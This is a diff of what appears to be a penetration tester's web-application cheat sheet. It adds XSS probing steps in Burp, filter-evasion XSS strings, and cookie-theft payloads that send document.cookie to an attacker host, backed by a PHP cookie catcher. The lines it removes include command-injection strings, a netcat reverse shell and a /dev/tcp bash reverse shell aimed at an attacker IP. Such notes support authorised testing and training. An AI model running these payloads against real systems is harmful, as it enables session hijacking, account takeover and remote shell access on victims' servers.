@@ -4,6 +4,56 @@ category: Web Application
 order: 5
 ---
 
+> **XSS Reflection Testing**
+
+**Using Burp - Step 1:** 
+1. Intruder-> Battering Ram (include user-agent, referer, cookie values)
+2. Payoad -> Use a magic string: 9vqkz (any random string)
+3. Options -> Search responses for payload strings -> magic string
+4. Sort on p grep, if found change attack type to sniper.
+
+**Using Burp - Step 2 Filter Test:**
+1. Repeat above with sniper and the following payloads (simple list):
+* <code> <>[]{}()$--'#"&;/ </code>
+* <code> '';!--"<XSS>=&{()} </code>
+* <code> <x>'"()= </code>
+* <code> ;[]{}'"() </code>
+* <code> jAvaSCript:prompt(9vqkz) </code>
+* <code> <script>alert(42);</script> </code>
+
+**Additional Payloads:**
+* Fuzzdb /attack-payloads/xss
+* JBroFuzz (built into ZAP)
+* Burp (Pro provides expanded payloads)
+* ZAP (JBroFUzz and some fuzzdb)
+* XSSer (includes some that the others don't have)
+
+**Additional XSS Test Strings**
+{% highlight html %}
+<script>alert(document.cookie);</script>
+<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
+<script src=http://www.example.com/malicious-code.js></script>
+%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
+\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
+>"><script>alert("XSS")</script>&
+"><STYLE>@import"javascript:alert('XSS')";</STYLE>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')> 
+<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
+{% endhighlight %}
+
+Tools:
+* XSSer 
+* xssniper
+* XSScrapy (xsssniper -u "http://sec542.com" --crawl --forms -http-proxy 127.0.0.1:8082)
+
+Resources:
+* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+
 > **Javascript Events for XSS**
 
 onload | change content after it loads
@@ -11,11 +61,24 @@ onunload | launch pop-under window to retain control of a zombie browser
 onsubmit | change form values os the transaction is one of the attacker's choosing
 onfocus | send http request to the attacker's web server to reveal which controls the user is selecting
 
+> **XSS Exploitation**
 
-> **XSS**
+**Exploitation Options**
+* Redirect to competitor (or other equivantly bad site) 
+	* <code> window.location.href = "http://www.sec542.org" ; </code>
+* Have form submit to you:
+	* <code> document.forms[1].action="http://www.sec542.org" </code>
+* Add Competitor logo
+* Negative fake information (or other content modification)
+* Read cookies
+* Fake Login Site 
 
-Get Cookie:
+**Basic Stealing Cookie:**
 {% highlight html %}
+#Attacker
+python -m SimpleHTTPServer 
+
+#Victim
 <script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
 {% endhighlight %}
 
@@ -29,52 +92,10 @@ POST:
 <script>document.getElementById('CSRF').submit();</script>
 {% endhighlight %}
 
-
-> **XSS Test Strings**
-
-{% highlight html %}
-'';!--"<XSS>=&{()}
-{% endhighlight %}
-
-{% highlight html %}
-<script>alert(document.cookie);</script>
-
-<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
-
-<script src=http://www.example.com/malicious-code.js></script>
-
-%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
-
-\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
-
->"><script>alert("XSS")</script>&
-
-"><STYLE>@import"javascript:alert('XSS')";</STYLE>
-
-<IMG SRC="javascript:alert('XSS');">
-
-<IMG SRC=javascript:alert('XSS')>
-
-<IMG SRC=JaVaScRiPt:alert('XSS')> 
-
-<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
-
-<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
-
-<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
-
-<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
-
-{% endhighlight %}
-
-
-Resources:
-* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-
-> **XSS Cookie Catcher**
-
+**XSS Cookie Catcher**
 {% highlight php %}
 
+#Attacker
 <?php
 $cookies = $_SERVER['REQUEST_URI'];
 $output = "Received=".$cookies."\n";
@@ -84,54 +105,11 @@ fclose($fh);
 echo "FOO!";
 ?>
 
-{% endhighlight %}
-
-> **Command Injection**
-{% highlight bash %}
-#Commix Automated Tool
-commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
-python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
-
-
-#Test Strings
-test`pwd`
-test$(pwd)
-test; pwd
-test | pwd
-test && pwd
-{% endhighlight %}
-
-> **Blind Command Injection**
-
-{% highlight bash %}
-#Attacker Machine
-tcpdump -n host <webserver IP> and ICMP
-nc -l [port]
 #Victim
-test; ping -c 4 <yourAttackerIP>; echo hello 
-test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
-#Alternative to NC for non-debian based distrobutions
-/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
-
-#Sleep method
-http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
+http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location;document.location='//[AttackerIP]/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>
+"
 {% endhighlight %}
 
-> **Web Shells**
-
-Kali: 
-
-PHP | <code> /usr/share/webshells/php/ </code>
-PERL | <code> /usr/share/webshells/perl/ </code>
-Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
-ASP | <code> /usr/share/webshells/asp/ </code>
-ASPX | <code> /usr/share/webshells/aspx/ </code>
-JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>
-
-Online:
-
-* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
-* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
 > **Useful Resources**
 
